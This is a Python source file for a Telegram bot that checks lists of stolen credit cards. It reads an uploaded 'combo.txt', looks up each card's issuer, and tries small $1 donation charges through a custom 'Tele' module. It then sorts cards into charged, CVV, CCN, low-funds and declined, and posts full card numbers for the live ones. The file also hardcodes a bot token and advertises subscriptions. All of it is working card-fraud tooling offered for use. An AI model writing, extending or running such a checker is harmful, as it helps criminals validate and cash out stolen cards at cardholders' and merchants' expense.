import requests
import telebot, time
import os
from gatet import Tele  # Assuming this is your custom module

token = '8265390366:AAEgq3odd3iH6YecaaQ4ADojmKsxKFar03A'
bot = telebot.TeleBot(token, parse_mode="HTML")

@bot.message_handler(commands=["start"])
def start(message):
    if not str(message.chat.id) == '1318826936':
        bot.reply_to(message, "You cannot use the bot to contact developers to purchase a bot subscription @iwillgoforwardsalone")
        return
    bot.reply_to(message, "Send the file now")

@bot.message_handler(content_types=["document"])
def main(message):
    if not str(message.chat.id) == '1318826936':
        bot.reply_to(message, "You cannot use the bot to contact developers to purchase a bot subscription @iwillgoforwardsalone")
        return
    
    dd = 0
    live = 0
    ch = 0
    ccn = 0
    cvv = 0
    lowfund = 0
    
    ko = (bot.reply_to(message, "CHECKING....⌛").message_id)
    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
    
    with open("combo.txt", "wb") as w:
        w.write(ee)
    
    try:
        with open("combo.txt", 'r') as file:
            lino = file.readlines()
            total = len(lino)
            processed = 0
            
            for cc in lino:
                cc = cc.strip()  # Clean whitespace
                if not cc:
                    continue
                
                current_dir = os.getcwd()
                for filename in os.listdir(current_dir):
                    if filename.endswith(".stop"):
                        bot.edit_message_text(
                            chat_id=message.chat.id, 
                            message_id=ko, 
                            text='STOP ✅\nBOT BY ➜ @iwillgoforwardsalone'
                        )
                        os.remove('stop.stop')
                        return
                
                # Get bin info
                bin_info = "Unknown"
                card_type = "Unknown"
                brand = "Unknown"
                country = "Unknown"
                country_flag = "Unknown"
                bank = "Unknown"
                
                try: 
                    data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
                    brand = data.get('brand', 'Unknown')
                    card_type = data.get('type', 'Unknown')
                    country = data.get('country_name', 'Unknown')
                    country_flag = data.get('country_flag', 'Unknown')
                    bank = data.get('bank', 'Unknown')
                except: 
                    pass
                
                start_time = time.time()
                try:
                    last = str(Tele(cc))
                except Exception as e:
                    print(e)
                    last = 'missing payment form'
                
                # Update progress message without inline keyboard
                processed += 1
                progress_msg = f'''Processing: {processed}/{total}
Current: {cc[:12]}XXXX
Status: {last}

Charged: {ch} | CCN: {ccn} | CVV: {cvv}
Low Funds: {lowfund} | Declined: {dd}

Bot by: @iwillgoforwardsalone'''
                
                bot.edit_message_text(
                    chat_id=message.chat.id, 
                    message_id=ko, 
                    text=progress_msg
                )
                
                end_time = time.time()
                execution_time = end_time - start_time
                
                print(last)
                
                if 'Donation Successful!' in last:
                    ch += 1
                    msg = f''' 
𝐂𝐀𝐑𝐃: <code>{cc}</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>Hit $1.00 🔥</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨: <code>{cc[:6]}-{card_type} - {brand}</code>
𝐁𝐚𝐧𝐤: <code>{bank}</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>

𝐓𝐢𝐦𝐞: <code>{"{:.1f}".format(execution_time)} second</code> 
𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: @iwillgoforwardsalone'''
                    bot.reply_to(message, msg)
                    
                elif 'Your card does not support this type of purchase' in last:
                    cvv += 1
                    
                elif 'security code is incorrect' in last or 'security code is invalid' in last:
                    ccn += 1
                    
                elif 'insufficient funds' in last:
                    lowfund += 1
                    msg = f'''            
𝐂𝐀𝐑𝐃: <code>{cc}</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>Insufficient funds 🔥</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨: <code>{cc[:6]}-{card_type} - {brand}</code>
𝐁𝐚𝐧𝐤: <code>{bank}</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>

𝐓𝐢𝐦𝐞: <code>{"{:.1f}".format(execution_time)} second</code> 
𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: @iwillgoforwardsalone'''
                    bot.reply_to(message, msg)
                    
                elif 'The payment needs additional action before completion!' in last:
                    cvv += 1
                    msg = f'''            
𝐂𝐀𝐑𝐃: <code>{cc}</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>3ds ✅</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨: <code>{cc[:6]}-{card_type} - {brand}</code>
𝐁𝐚𝐧𝐤: <code>{bank}</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>

𝐓𝐢𝐦𝐞: <code>{"{:.1f}".format(execution_time)} second</code> 
𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: @iwillgoforwardsalone'''
                    bot.reply_to(message, msg)
                    
                else:
                    dd += 1
                    time.sleep(5)
                    
    except Exception as e:
        print(f"Error: {e}")
        bot.edit_message_text(
            chat_id=message.chat.id, 
            message_id=ko, 
            text=f'Error occurred: {str(e)}'
        )
        return
    
    bot.edit_message_text(
        chat_id=message.chat.id, 
        message_id=ko, 
        text=f'''CHECKED ✅
        
Final Results:
Total: {total}
Charged: {ch}
CCN: {ccn}
CVV: {cvv}
Low Funds: {lowfund}
Declined: {dd}

BOT BY ➜ @iwillgoforwardsalone'''
    )

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    # Since we removed inline keyboard, this won't be used anymore
    # But keeping it for backward compatibility
    with open("stop.stop", "w") as file:
        pass

bot.polling()
